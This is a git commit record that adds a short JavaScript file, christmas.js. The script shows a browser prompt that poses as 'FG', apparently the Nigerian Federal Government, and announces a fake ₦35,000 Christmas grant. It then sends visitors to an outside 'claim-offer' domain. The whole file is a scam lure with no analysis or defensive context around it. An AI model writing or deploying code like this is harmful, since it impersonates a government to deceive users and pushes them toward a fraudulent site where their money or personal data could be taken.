80cf9820c732b3f5f63328541389f59d1c36b9a4
bigetijazz4 <bigetijazz4@gmail.com>
2024-11-08 06:01:38 -0800

    Create christmas.js

---
+++ christmas.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw ₦35,000'
+password=prompt('FG: Congratulations you are eligible to receive ₦35,000 Grant in celebration of Christmas day, Kindly press Ok to Withdraw Cash','Withdraw ₦35,000');
+if (password != 'Withdraw ₦35,000') {
+location.href='https://www.moreofferzdetails.xyz/claim-offer';
+}
